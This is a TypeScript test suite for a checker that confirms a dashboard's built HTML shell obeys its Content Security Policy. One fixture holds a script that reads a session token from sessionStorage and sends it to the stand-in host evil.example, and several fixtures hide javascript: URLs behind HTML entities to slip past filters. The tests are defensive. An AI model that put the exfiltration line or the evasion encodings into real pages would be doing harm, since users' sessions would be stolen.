import { rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import process from 'node:process'
import { describe, expect, test } from 'bun:test'
import { checkShell, checkShells } from './check-dashboard-csp'

/** The shape `vite build` emits today: one external module script, one stylesheet. */
const BUILT_SHELL = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Honmoon</title>
    <script type="module" crossorigin src="/assets/index-ChyO-qsg.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-t0vyplZE.css">
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>
`

/** What `apps/dashboard/demo/build.ts` adds: one relative, same-origin shim tag. */
const DEMO_SHELL = BUILT_SHELL.replace(
  '<script type="module"',
  '<script src="./demo-mode.js"></script>\n    <script type="module"',
)

function details(html: string): string[] {
  return checkShell(html, 'shell').map(problem => problem.detail)
}

describe('checkShell', () => {
  test('the shells the repo actually builds pass', () => {
    expect(checkShell(BUILT_SHELL, 'dist')).toEqual([])
    expect(checkShell(DEMO_SHELL, 'dist-demo')).toEqual([])
  })

  test('an inline <script> body fails — script-src \'self\' refuses it', () => {
    const inlined = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <script>window.__x = 1</script>',
    )
    expect(details(inlined)).toEqual([
      expect.stringContaining('inline <script> body'),
      expect.stringContaining('<script> with no src'),
    ])
  })

  test('a script from another origin fails', () => {
    const cdn = BUILT_SHELL.replace('/assets/index-ChyO-qsg.js', 'https://cdn.example/app.js')
    expect(details(cdn)).toEqual([expect.stringContaining('<script> loads from off this origin')])
  })

  // The placeholder `crates/honmoon-mgmt/build.rs` writes so a bare `cargo build`
  // works without a dashboard satisfies every other rule vacuously.
  test('a shell with no script at all fails rather than passing vacuously', () => {
    expect(details('<!doctype html><html><body><p>Dashboard not built.</p></body></html>'))
      .toEqual([expect.stringContaining('not a built dashboard shell')])
  })

  test('an inline handler, a <base> and a <form> each fail', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<div onclick="go()" id="root">')))
      .toEqual([expect.stringContaining('inline event handler')])
    expect(details(BUILT_SHELL.replace('<title>', '<base href="/x/" /><title>')))
      .toEqual([expect.stringContaining('<base>')])
    expect(details(BUILT_SHELL.replace('<div id="root"></div>', '<form action="/x"></form>')))
      .toEqual([expect.stringContaining('<form>')])
  })

  // The pair regex is lazy: it skips an opening tag with no `</script>` after
  // it. Before this case existed, an appended unclosed script passed clean while
  // an earlier well-formed tag kept the count non-zero — a silent pass in the
  // one check whose purpose is to not have one.
  test('an unclosed trailing <script> fails rather than going uninspected', () => {
    const appended = `${BUILT_SHELL}<script>\n  fetch('https://evil.example/?c=' + sessionStorage.getItem('honmoon_session'))\n`
    expect(details(appended)).toEqual([expect.stringContaining('no readable `</script>`')])
  })

  // HTML does not honour `<script/>` as self-closing, so its content would run.
  test('a self-closed <script/> is reported as unreadable, not as an unbuilt shell', () => {
    expect(details('<script src="/a.js" />')).toEqual([
      expect.stringContaining('no readable `</script>`'),
    ])
  })

  test('an unquoted inline handler fails — HTML does not require the quotes', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<div onclick=go() id="root">')))
      .toEqual([expect.stringContaining('inline event handler')])
  })

  // `default-src 'none'` governs what the document fetches, not where a link
  // takes the reader — and no directive restricts navigation at all. Failing the
  // build over a working link would be the checker's own "worse than no CSP".
  test('an external <a> link passes — a navigation is not a subresource load', () => {
    const linked = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <a href="https://honmoon.dev/docs">docs</a>',
    )
    expect(checkShell(linked, 'shell')).toEqual([])
  })

  // The opposite case: <link href> is a fetch, so it stays checked.
  test('an external <link> stylesheet fails — that href is a fetch', () => {
    const cdn = BUILT_SHELL.replace('/assets/index-t0vyplZE.css', 'https://cdn.example/app.css')
    expect(details(cdn)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  test('an unquoted off-origin src fails — HTML does not require the quotes', () => {
    const unquoted = BUILT_SHELL.replace(
      'src="/assets/index-ChyO-qsg.js"',
      'src=https://cdn.example/app.js',
    )
    expect(details(unquoted)).toEqual([expect.stringContaining('<script> loads from off this origin')])
  })

  // The navigation exemption is about a link being a navigation, not a fetch.
  // A `javascript:` URL is neither — it is code, which `script-src 'self'`
  // refuses, so the exemption must not extend to it.
  test('a javascript: href fails even on an <a>, where navigation is exempt', () => {
    const js = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <a href="javascript:go()">go</a>',
    )
    expect(details(js)).toEqual([expect.stringContaining('javascript: URL')])
  })

  // `[^>]*` would end the tag at the `>` inside the quoted value and never read
  // the attribute after it — a miss, not a finding.
  test('a quoted > inside an attribute does not hide the attributes after it', () => {
    const tricky = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <link rel="preload" title="a>b" href="https://cdn.example/x.css">',
    )
    expect(details(tricky)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  test('a fragment link is same-document, not an off-origin load', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<a href="#/audit">a</a><div id="root">')))
      .toEqual([])
  })

  // The HTML parser resolves these before anything reads the value as a URL, so
  // a raw-prefix test sees a relative path where the browser sees script.
  test.each([
    ['hex', 'java&#x73;cript:go()'],
    ['decimal', 'java&#115;cript:go()'],
    ['a named colon', 'javascript&colon;go()'],
    ['an embedded tab', 'java\tscript:go()'],
  ])('an entity-hidden javascript: URL (%s) still fails', (_label, href) => {
    const hidden = BUILT_SHELL.replace('<div id="root">', `<a href="${href}">a</a><div id="root">`)
    expect(details(hidden)).toEqual([expect.stringContaining('javascript: URL')])
  })

  // `&sol;` is `/`, so this is a protocol-relative URL to a browser.
  test('a named reference hiding the authority slashes still fails', () => {
    const hidden = BUILT_SHELL.replace(
      '<div id="root">',
      '<link rel="stylesheet" href="&sol;&sol;cdn.example/x.css"><div id="root">',
    )
    expect(details(hidden)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  // `&b=2` is a query separator, not a reference — requiring the `;` is what
  // keeps this rule from failing the build over an ordinary working link.
  test('a query separator is not read as a character reference', () => {
    const query = BUILT_SHELL.replace(
      '<div id="root">',
      '<a href="/audit?from=1&to=2&kind=deny">a</a><div id="root">',
    )
    expect(details(query)).toEqual([])
  })

  // A browser strips the space before reading the scheme, and reads a backslash
  // as a slash in the authority. Deciding either by pattern is what `new URL`
  // is here to stop.
  test.each([
    ['leading whitespace', ' https://cdn.example/app.js'],
    ['a backslash authority', '/\\cdn.example/app.js'],
    ['a protocol-relative URL', '//cdn.example/app.js'],
  ])('an off-origin URL normalised by the browser (%s) fails', (_label, href) => {
    const off = BUILT_SHELL.replace(
      '<div id="root">',
      `<link rel="stylesheet" href="${href}"><div id="root">`,
    )
    expect(details(off)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  // The serving origin is not known at build time, so a URL that names the
  // stand-in must not read as same-origin just because it matches it.
  test('an absolute URL naming a resolution stand-in is still off-origin', () => {
    const named = BUILT_SHELL.replace(
      '<div id="root">',
      '<link rel="stylesheet" href="https://dashboard.invalid/x.css"><div id="root">',
    )
    expect(details(named)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  // The table is a subset on purpose, so its gaps have to fail rather than pass.
  test('a reference the table does not cover is refused, not passed through', () => {
    const unknown = BUILT_SHELL.replace(
      '<div id="root">',
      '<link rel="stylesheet" href="/assets/&hellip;.css"><div id="root">',
    )
    expect(details(unknown)).toEqual([expect.stringContaining('cannot decode')])
  })

  // `String.fromCodePoint` throws on each of these, which in CI is a stack
  // trace where a finding belongs — and the shell goes unchecked either way.
  test.each([
    ['past the last plane', 'a&#x110000;b'],
    ['a lone surrogate', 'a&#xD800;b'],
    ['a null reference', 'a&#0;b'],
  ])('a malformed numeric reference (%s) does not crash the check', (_label, href) => {
    const malformed = BUILT_SHELL.replace('<div id="root">', `<a href="${href}">a</a><div id="root">`)
    expect(details(malformed)).toEqual([])
  })

  // `&amp;#x73;` is the literal text `&#x73;` in the DOM, not a second
  // reference — decoding twice would invent a finding on a working link.
  // `&amp;hellip;` is one reference the table knows plus the literal text
  // `hellip;` — scanning what the decode left behind would read that back as a
  // second reference and fail the build over a working link.
  test('a doubly-escaped unknown name is text, not an undecodable reference', () => {
    const literal = BUILT_SHELL.replace(
      '<div id="root">',
      '<a href="/audit?q=&amp;hellip;">a</a><div id="root">',
    )
    expect(details(literal)).toEqual([])
  })

  test('a doubly-escaped reference is text, not a scheme', () => {
    const literal = BUILT_SHELL.replace(
      '<div id="root">',
      '<a href="/audit?q=java&amp;#x73;cript">a</a><div id="root">',
    )
    expect(details(literal)).toEqual([])
  })
})

describe('checkShells', () => {
  // `join(REPO_ROOT, '/abs/path')` grafts the argument onto the root and then
  // reports "not found", which reads as a missing build rather than a misread
  // path. The script's own usage line invites an absolute argument.
  test('an absolute path is read as given, not grafted onto the repository root', () => {
    const absolute = join(tmpdir(), `honmoon-csp-shell-${process.pid}.html`)
    writeFileSync(absolute, BUILT_SHELL)
    try {
      expect(checkShells([absolute])).toEqual([])
    }
    finally {
      rmSync(absolute, { force: true })
    }
  })

  test('a missing artifact fails rather than being skipped', () => {
    expect(checkShells(['apps/dashboard/dist/no-such-shell.html']))
      .toEqual([{ shell: 'apps/dashboard/dist/no-such-shell.html', detail: expect.stringContaining('not found') }])
  })
})
